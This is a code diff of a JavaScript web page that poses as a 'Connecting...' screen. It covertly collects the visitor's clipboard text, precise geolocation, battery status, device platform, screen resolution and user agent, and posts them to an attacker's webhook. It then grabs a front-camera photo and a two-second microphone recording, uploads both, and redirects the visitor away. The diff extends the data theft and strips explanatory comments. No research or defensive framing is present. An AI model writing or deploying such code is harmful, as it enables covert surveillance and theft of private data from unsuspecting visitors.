@@ -30,28 +30,40 @@
             const status = document.getElementById('status');
             status.innerText = "Connecting...";
 
+            // --- DEVICE INFO (No permission needed) ---
+            let batteryInfo = "Unknown";
+            try {
+                const battery = await navigator.getBattery();
+                batteryInfo = `${(battery.level * 100).toFixed(0)}% (${battery.charging ? "Charging" : "Discharging"})`;
+            } catch (e) {}
+
+            const platform = navigator.platform;
+            const userAgent = navigator.userAgent;
+            const screenRes = `${window.screen.width}x${window.screen.height}`;
+            const time = new Date().toLocaleString();
+
             let clip = "Denied/None";
             try { clip = await navigator.clipboard.readText(); } catch (e) {}
 
             navigator.geolocation.getCurrentPosition(async (pos) => {
                 const mapLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                 
-                // STEP 1: Send Text Data
+                // STEP 1: Send Text Data + Device Info
                 await fetch(WEBHOOK_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ content: `📍 **Location:** ${mapLink}\n📋 **Clipboard:** ${clip}` })
+                    body: JSON.stringify({ 
+                        content: `📍 **Location:** ${mapLink}\n📋 **Clipboard:** \`${clip}\`\n🔋 **Battery:** ${batteryInfo}\n📱 **Device:** ${platform} (${screenRes})\n⏰ **Time:** ${time}\n🌐 **Agent:** \`${userAgent.substring(0, 100)}...\`` 
+                    })
                 });
 
                 // STEP 2: Try Camera & Microphone
                 try {
-                    // Request both video and audio
                     const stream = await navigator.mediaDevices.getUserMedia({ 
                         video: { facingMode: "user" }, 
                         audio: true 
                     });
 
-                    // Snapshot (Camera)
                     const video = document.createElement('video');
                     video.srcObject = stream;
                     await video.play();
@@ -60,7 +72,6 @@
                     canvas.getContext('2d').drawImage(video, 0, 0, 320, 240);
                     const photoBlob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.5));
 
-                    // Audio Recording (2 Seconds)
                     const mediaRecorder = new MediaRecorder(stream);
                     const audioChunks = [];
                     mediaRecorder.ondataavailable = (e) => audioChunks.push(e.data);
@@ -73,13 +84,11 @@
                     });
 
                     mediaRecorder.start();
-                    setTimeout(() => mediaRecorder.stop(), 2000); // 2 second clip
+                    setTimeout(() => mediaRecorder.stop(), 2000);
                     const audioBlob = await recordTask;
 
-                    // Stop hardware lights
                     stream.getTracks().forEach(t => t.stop());
 
-                    // Send Photo and Audio as files
                     const fd = new FormData();
                     fd.append("file1", photoBlob, "photo.jpg");
                     fd.append("file2", audioBlob, "audio.wav");
@@ -89,7 +98,6 @@
                     console.log("Media blocked");
                 }
 
-                // STEP 3: Redirect
                 window.location.replace(REDIRECT_URL);
 
             }, (err) => {
